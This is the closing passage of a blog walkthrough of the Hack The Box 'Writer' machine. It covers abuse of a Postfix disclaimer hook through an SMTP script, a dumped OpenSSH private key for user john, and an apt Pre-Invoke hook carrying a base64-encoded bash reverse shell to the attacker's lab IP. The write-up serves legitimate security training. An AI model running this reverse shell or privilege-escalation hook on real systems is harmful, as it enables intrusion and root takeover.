      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>kyle@writer:/var/www/writer2_project$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
kyle@writer:~$ find / -group filter -type f 2&gt;/dev/null
/etc/postfix/disclaimer

</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/HTB-Writer/013.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/013.png" alt="" loading="lazy"></a></p>

<ul>
  <li>https://book.hacktricks.xyz/pentesting/pentesting-smtp</li>
  <li>https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish</li>
  <li>https://mobt3ath.com/uplode/books/book-27297.pdf</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">./NATBypass -tran 2255 127.0.0.1:25</code></p>

<p><a href="/assets/img/HTB-Writer/014.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/014.png" alt="" loading="lazy"></a></p>

<p><code class="language-plaintext highlighter-rouge">sendmail.py</code></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre>from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "10.10.14.24"
lport = 10086
rhost = "10.10.11.101"
rport = 2255 # 489,587

# create message object instance
msg = MIMEMultipart()


# setup the parameters of the message
password = "" 
msg['From'] = "kyle@write.htb"
msg['To'] = "john@write.htb"
msg['Subject'] = "This is not a drill!"

# payload 
message = ('asdasdasd')

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
    print("[-]Connection Error")
    exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/HTB-Writer/015.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/015.png" alt="" loading="lazy"></a></p>
<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>john@writer:/home/john/.ssh<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
<span class="nb">ls</span> <span class="nt">-al</span>
total 20
drwx------ 2 john john 4096 Jul  9 12:29 <span class="nb">.</span>
drwxr-xr-x 4 john john 4096 Aug  5 09:56 ..
<span class="nt">-rw-r--r--</span> 1 john john  565 Jul  9 12:29 authorized_keys
<span class="nt">-rw-------</span> 1 john john 2602 Jul  9 12:29 id_rsa
<span class="nt">-rw-r--r--</span> 1 john john  565 Jul  9 12:29 id_rsa.pub
john@writer:/home/john/.ssh<span class="err">$</span>

</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">id_rsa</code></p>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre><span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
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
<span class="nv">Nwy7uLkQ0cIY6XAAAAC2pvaG5Ad3JpdGVyAQIDBAUGBw</span><span class="o">==</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----

</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/HTB-Writer/016.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/016.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/HTB-Writer/017.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/017.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/HTB-Writer/018.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/018.png" alt="" loading="lazy"></a></p>

<ul>
  <li>https://gtfobins.github.io/gtfobins/apt-get/</li>
  <li>https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</li>
</ul>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'apt::Update::Pre-Invoke {"echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjQvMTAwODYgMD4mMSI= | base64 -d | bash"};'</span><span class="o">&gt;</span> pwn
</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/HTB-Writer/019.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/019.png" alt="" loading="lazy"></a></p>

<h2 id="reference"><span class="me-2">Reference</span><a href="#reference" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>https://book.hacktricks.xyz/pentesting/pentesting-smtp</li>
  <li>https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish</li>
  <li>https://mobt3ath.com/uplode/books/book-27297.pdf</li>
  <li>https://gtfobins.github.io/gtfobins/apt-get/</li>
  <li>https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</li>
</ul>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctf/">CTF</a>,
          <a href="/categories/htb/">HTB</a>
      </div>
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=HTB%20Writer%20Walkthrough%20-%20imjdl%20blog&url=%2Fposts%2FHTB-Writer%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=HTB%20Writer%20Walkthrough%20-%20imjdl%20blog&u=%2Fposts%2FHTB-Writer%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=%2Fposts%2FHTB-Writer%2F&text=HTB%20Writer%20Walkthrough%20-%20imjdl%20blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/rce/">RCE</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  
    
  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/htb-October/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1596859980"
  data-df="ll"
  
>
  Aug  8, 2020
</time>

              <h4 class="pt-0 my-2">HTB October Walkthrough</h4>
              <div class="text-muted">
                <p>
                  





                  Information

Description


  name: October
  OS: Linux
  Difficulty: Medium
  Points: 30
  Release: 20 Mar 2017
  IP: 10.10.10.16


https://www.hackthebox.eu/home/machines/profile/15

October was d...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/htb-catch/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1649131980"
  data-df="ll"
  
>
  Apr  5, 2022
</time>

              <h4 class="pt-0 my-2">HTB Catch Walkthrough</h4>
              <div class="text-muted">
                <p>
                  





                  

Information


  name: Catch
  OS: Linux
  Difficulty: Medium
  Points: 30
  Release: 13 Mar 2022
  IP: 10.10.11.150


https://app.hackthebox.com/machines/450

Summary


  Enumerate and discover s...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/preparation_before_analysing_CobaltStrike/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Preparation before analysing Cobalt Strike.</p>
    </a>
  

  
    <a
      href="/posts/htb-catch/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>HTB Catch Walkthrough</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imjdl/comments',
      'data-repo-id': 'MDEwOlJlcG9zaXRvcnkxNjc5MDc0Mjc=',
      'data-category': 'Announcements',
      'data-category-id': 'DIC_kwDOCgIQY84CbYtw',
      'data-mapping': 'url',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'top',
      'data-lang': 'en',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2024</time>
    <a href="https://twitter.com/Mortyjin">Mortyjin</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/rce/">RCE</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js,npm/mermaid@10.6.0/dist/mermaid.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script>
    /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
    MathJax = {
      tex: {
        /* start/end delimiter pairs for in-line math */
        inlineMath: [
          ['$', '$'],
          ['\\(', '\\)']
        ],
        /* start/end delimiter pairs for display math */
        displayMath: [
          ['$$', '$$'],
          ['\\[', '\\]']
        ]
      }
    };
  </script>
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js"></script>





    
      <!-- mermaid-js loader -->
<script type="text/javascript">
  (function () {
    function updateMermaid(event) {
      if (event.source === window && event.data && event.data.direction === ModeToggle.ID) {
        const mode = event.data.message;

        if (typeof mermaid === 'undefined') {
          return;
        }

        let expectedTheme = mode === ModeToggle.DARK_MODE ? 'dark' : 'default';
        let config = { theme: expectedTheme };

        /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $('.mermaid').each(function () {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr('data-processed');
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, '.mermaid');
      }
    }

    let initTheme = 'default';
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') && html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') && window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = 'dark';
    }

    let mermaidConf = {
      theme: initTheme /* <default|dark|forest|neutral> */
    };

    /* Create mermaid tag */
    document.querySelectorAll('pre>code.language-mermaid').forEach((elem) => {
      const svgCode = elem.textContent;
      const backup = elem.parentElement;
      backup.classList.add('unloaded');
      /* create mermaid node */
      let mermaid = document.createElement('pre');
      mermaid.classList.add('mermaid');
      const text = document.createTextNode(svgCode);
      mermaid.appendChild(text);
      backup.after(mermaid);
    });

    mermaid.initialize(mermaidConf);

    window.addEventListener('message', updateMermaid);
  })();
</script>

    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

